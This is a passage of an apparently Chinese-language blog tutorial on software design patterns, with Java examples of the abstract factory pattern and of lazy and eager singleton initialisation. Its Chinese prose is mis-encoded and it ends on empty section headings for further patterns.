title="I.ç‰©å“æ¥å£"></a>I.ç‰©å“æ¥å£</h3><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦å®šä¹‰æˆ‘ä»¬â€œç”Ÿäº§â€çš„å¯¹è±¡çš„ç±»å‹ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬è¿™ä¸ªç”Ÿäº§å·¥å‚å¯ä»¥ç”Ÿäº§å„ç³» iPhone å’Œ iPadï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œä¾¿å®šä¹‰ä¸€ä¸ª_è®¾å¤‡ç±»çš„æ¥å£ç±»_ä½œä¸ºä¸åŒäº§å“çš„æ¥å£ï¼ŒåŒæ—¶å£°æ˜ä¸€äº›è¿™äº›è®¾å¤‡<strong>å…±æœ‰</strong>çš„æ–¹æ³•ï¼Œè¿™é‡Œéšä¾¿å®šä¹‰ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºäº Device ç±»ï¼Œæˆ‘ä»¬å†å®šä¹‰ä¸¤ä¸ª<strong>æŠ½è±¡ç±»</strong>â€”â€”iPhone å’Œ iPad</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">iPhone</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">iPad</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="II-å·¥å‚æ¥å£-1"><a href="#II-å·¥å‚æ¥å£-1" class="headerlink" title="II.å·¥å‚æ¥å£"></a>II.å·¥å‚æ¥å£</h3><p>è¦å®ç°ä¸åŒç±»å‹çš„å·¥å‚ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å…ˆå®šä¹‰ä¸€ä¸ªå·¥å‚ç±»çš„æ¥å£ç±»ï¼Œæˆ‘ä»¬è¦â€œç”Ÿäº§â€çš„æ˜¯ç”µå­è®¾å¤‡ï¼Œé‚£å°±å«_DeviceFactor_ å¥½äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="III-ç‰©å“å®ä½“ç±»-1"><a href="#III-ç‰©å“å®ä½“ç±»-1" class="headerlink" title="III.ç‰©å“å®ä½“ç±»"></a>III.ç‰©å“å®ä½“ç±»</h3><p>æœ‰äº† iPhone å’Œ iPad è¿™ä¸¤ä¸ªæŠ½è±¡ç±»ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å®šä¹‰å…·ä½“çš„è®¾å¤‡äº†ï¼Œæ¯”å¦‚ iPhone13 ç±»å’Œ iPad ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13</span> <span class="keyword">extends</span> <span class="title class_">iPhone</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPhone13.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPhone13 is going to reboot sooooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5</span> <span class="keyword">extends</span> <span class="title class_">iPad</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPad5.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPad5 is going to reboot sooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IV-å·¥å‚ç±»-1"><a href="#IV-å·¥å‚ç±»-1" class="headerlink" title="IV.å·¥å‚ç±»"></a>IV.å·¥å‚ç±»</h3><p>æœ‰äº†å·¥å‚æ¥å£ä¸ç‰©å“æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹å®ç°æˆ‘ä»¬çš„å·¥å‚ç±»äº†ï¼Œå¯¹äº iPhone è€Œè¨€æˆ‘ä»¬éœ€è¦ä¸€ä¸ª iPhoneFactoryï¼Œè€Œå¯¹äº iPad æˆ‘ä»¬åˆ™éœ€è¦ä¸€ä¸ªç‹¬ç«‹çš„ iPad å·¥å‚ï¼Œç›¸åº”åœ°è¿™ä¸¤ä¸ªå·¥å‚éƒ½è¦å®ç°å·¥å‚æ¥å£çš„ <code>createDevice()</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhoneFactory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">13</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPhone13</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPadFactory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPad5</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="O-æŠ½è±¡å·¥å‚æ¨¡å¼çš„å·¥ä½œæ–¹å¼"><a href="#O-æŠ½è±¡å·¥å‚æ¨¡å¼çš„å·¥ä½œæ–¹å¼" class="headerlink" title="O.æŠ½è±¡å·¥å‚æ¨¡å¼çš„å·¥ä½œæ–¹å¼"></a><em>O.æŠ½è±¡å·¥å‚æ¨¡å¼çš„å·¥ä½œæ–¹å¼</em></h3><p>ä»¥ä¸‹æµ‹è¯•ä¸»ç¨‹åºç”¨ä»¥è¯´æ˜å·¥å‚æ–¹æ³•æ¨¡å¼å¦‚ä½•å·¥ä½œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractFactoryPattern</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">iPhoneFactory</span> <span class="variable">iphone_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPhoneFactory</span>();</span><br><span class="line">        <span class="type">iPadFactory</span> <span class="variable">ipad_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPadFactory</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">iPhone</span> <span class="variable">iPhone_13</span> <span class="operator">=</span> iphone_factory.createDevice(<span class="number">13</span>);</span><br><span class="line">        <span class="type">iPad</span> <span class="variable">iPad_5</span> <span class="operator">=</span> ipad_factory.createDevice(<span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        iPhone_13.showScreen();</span><br><span class="line">        iPad_5.showScreen();</span><br><span class="line">        </span><br><span class="line">        iPhone_13.reboot();</span><br><span class="line">        iPad_5.reboot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is screen of iPhone13.</span><br><span class="line">This is screen of iPad5.</span><br><span class="line">The iPhone13 is going to reboot sooooooon...</span><br><span class="line">The iPad5 is going to reboot sooooon...</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€å•ä¾‹æ¨¡å¼ï¼ˆSingleton-Patternï¼‰"><a href="#ä¸‰ã€å•ä¾‹æ¨¡å¼ï¼ˆSingleton-Patternï¼‰" class="headerlink" title="ä¸‰ã€å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰"></a>ä¸‰ã€å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰</h2><p>å•ä¾‹æ¨¡å¼å³<strong>åœ¨ä¸€ä¸ªè¿›ç¨‹å½“ä¸­ï¼Œä¸€ä¸ªç±»è‡³å¤šä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªå…¨å±€è®¿é—®ç‚¹</strong>ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åªéœ€è¦ä¸€ä¸ªå…¨å±€å®ä¾‹æ—¶ï¼Œä¾¿å¯ä»¥ä½¿ç”¨å•ä¾‹æ¨¡å¼ï¼ˆä¾‹å¦‚ glibc ä¸­çš„ errnoï¼Ÿï¼‰</p><p>å•ä¾‹æ¨¡å¼èƒ½å¤Ÿé¿å…å¯¹è±¡çš„é‡å¤åˆ›å»ºï¼Œä»è€ŒèŠ‚çº¦ç©ºé—´ï¼Œå¹¶èƒ½é¿å…ç”±äºæ“ä½œä¸åŒå®ä¾‹è€Œå¯¼è‡´çš„é€»è¾‘é”™è¯¯</p><p>å•ä¾‹æ¨¡å¼æ¶‰åŠçš„å¯¹è±¡é€šå¸¸æœ‰ä¸¤ç§åˆ›å»ºæ–¹å¼ï¼ˆåå­—æ€ªæ€ªçš„ï¼‰ï¼š</p><h3 id="æ‡’æ±‰æ–¹å¼"><a href="#æ‡’æ±‰æ–¹å¼" class="headerlink" title="æ‡’æ±‰æ–¹å¼"></a>æ‡’æ±‰æ–¹å¼</h3><p>ç±»ä¼¼äº Linux ä¸‹çš„ lazy-binding æœºåˆ¶ï¼Œæˆ‘ä»¬å¹¶ä¸åœ¨ä¸€è¿è¡Œç¨‹åºä¾¿åˆ›å»ºå¯¹è±¡å®ä¾‹ï¼Œè€Œæ˜¯ç­‰åˆ°æˆ‘ä»¬ç¬¬ä¸€æ¬¡ä½¿ç”¨è¯¥å¯¹è±¡æ—¶å†è¿›è¡Œåˆ›å»º</p><p>è¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleObject</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;SimpleObject is created!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.val = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InterfaceOutside</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleObject</span> <span class="variable">simpleObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.simpleObject == <span class="literal">null</span>)</span><br><span class="line"><span class="built_in">this</span>.simpleObject = <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.simpleObject.getVal();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.simpleObject == <span class="literal">null</span>)</span><br><span class="line"><span class="built_in">this</span>.simpleObject = <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line"><span class="built_in">this</span>.simpleObject.setVal(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonPattern</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Create new InterfaceOutside instance.&quot;</span>);</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Set val of instance1&quot;</span>);</span><br><span class="line">instance1.setVal(<span class="number">114514</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Get val of instance2: &quot;</span> + Integer.toString(instance2.getVal()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create new InterfaceOutside instance.</span><br><span class="line">Done.</span><br><span class="line">Set val of instance1</span><br><span class="line">SimpleObject is created!</span><br><span class="line">Get val of instance2: 114514</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†ä¿è¯åˆå§‹åŒ–çš„<strong>çº¿ç¨‹å®‰å…¨</strong>ï¼ŒInterfaceOutside ç±»çš„ä¸¤ä¸ªæ–¹æ³•éƒ½ä¸Šäº†é”ï¼Œä¸”æ¯æ¬¡éƒ½éœ€è¦åˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¼šé€ æˆ<strong>ä¸å¯å¿½è§†çš„æ€§èƒ½å¼€é”€</strong>ï¼Œæ•…é€šå¸¸æƒ…å†µä¸‹ä¸ä¼šä½¿ç”¨æ‡’æ±‰æ–¹å¼æ¥åˆ›å»ºå•ä¾‹æ¨¡å¼ä¸­çš„å¯¹è±¡å®ä¾‹</p><h3 id="é¥¿æ±‰æ–¹å¼"><a href="#é¥¿æ±‰æ–¹å¼" class="headerlink" title="é¥¿æ±‰æ–¹å¼"></a>é¥¿æ±‰æ–¹å¼</h3><p>ç›¸æ¯”äºæ‡’æ±‰æ–¹å¼ï¼Œé¥¿æ±‰æ–¹å¼ä¼šåœ¨ä¸€å¼€å§‹å°±å°†éœ€è¦ç”¨åˆ°çš„å®ä¾‹è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™ç§æ–¹å¼ä¾¿èƒ½å¤Ÿç›´æ¥ä½¿ç”¨å·²ç»ç”Ÿæˆçš„å¯¹è±¡ï¼Œè€Œä¸éœ€è¦åˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜åœ¨</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼æ— è®ºä½ åœ¨ç¨‹åºä¸­æ˜¯å¦éœ€è¦ä½¿ç”¨è¯¥å¯¹è±¡ï¼Œä»–éƒ½ä¼šå°†è¯¥å¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™é€šå¸¸ä¼šé€ æˆé¢å¤–çš„å¼€é”€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleObject</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;SimpleObject is created!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.val = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InterfaceOutside</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleObject</span> <span class="variable">simpleObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.simpleObject.getVal();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.simpleObject.setVal(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonPattern</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Create new InterfaceOutside instance.&quot;</span>);</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Set val of instance1&quot;</span>);</span><br><span class="line">instance1.setVal(<span class="number">114514</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Get val of instance2: &quot;</span> + Integer.toString(instance2.getVal()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create new InterfaceOutside instance.</span><br><span class="line">SimpleObject is created!</span><br><span class="line">Done.</span><br><span class="line">Set val of instance1</span><br><span class="line">Get val of instance2: 114514</span><br></pre></td></tr></table></figure><h2 id="å››ã€å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder-Patternï¼‰"><a href="#å››ã€å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder-Patternï¼‰" class="headerlink" title="å››ã€å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder Patternï¼‰"></a>å››ã€å»ºé€ è€…æ¨¡å¼ï¼ˆBuilder Patternï¼‰</h2><h2 id="äº”ã€åŸå‹æ¨¡å¼"><a href="#äº”ã€åŸå‹æ¨¡å¼" class="headerlink" title="äº”ã€åŸå‹æ¨¡å¼"></a>äº”ã€åŸå‹æ¨¡å¼</h2><h1 id="0x02-ç»“æ„å‹æ¨¡å¼"><a href="#0x02-ç»“æ„å‹æ¨¡å¼" class="headerlink" title="0x02.ç»“æ„å‹æ¨¡å¼"></a>0x02.ç»“æ„å‹æ¨¡å¼</h1><p>åœ¨è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œç»“æ„å‹æ¨¡å¼ä¸»è¦å…³æ³¨äº<strong>å„ä¸ªå…ƒä»¶é—´çš„å…³ç³»</strong>ï¼Œä»¥æ­¤ç®€åŒ–è®¾è®¡</p><h2 id="ä¸€ã€é€‚é…å™¨æ¨¡å¼"><a href="#ä¸€ã€é€‚é…å™¨æ¨¡å¼" class="headerlink" title="ä¸€ã€é€‚é…å™¨æ¨¡å¼"></a>ä¸€ã€é€‚é…å™¨æ¨¡å¼</h2><h2 id="äºŒã€è£…é¥°å™¨æ¨¡å¼"><a href="#äºŒã€è£…é¥°å™¨æ¨¡å¼" class="headerlink" title="äºŒã€è£…é¥°å™¨æ¨¡å¼"></a>äºŒã€è£…é¥°å™¨æ¨¡å¼</h2><h2 id="ä¸‰ã€ä»£ç†æ¨¡å¼"><a href="#ä¸‰ã€ä»£ç†æ¨¡å¼" class="headerlink" title="ä¸‰ã€ä»£ç†æ¨¡å¼"></a>ä¸‰ã€ä»£ç†æ¨¡å¼</h2><h2 id="å››ã€å¤–è§‚æ¨¡å¼"><a 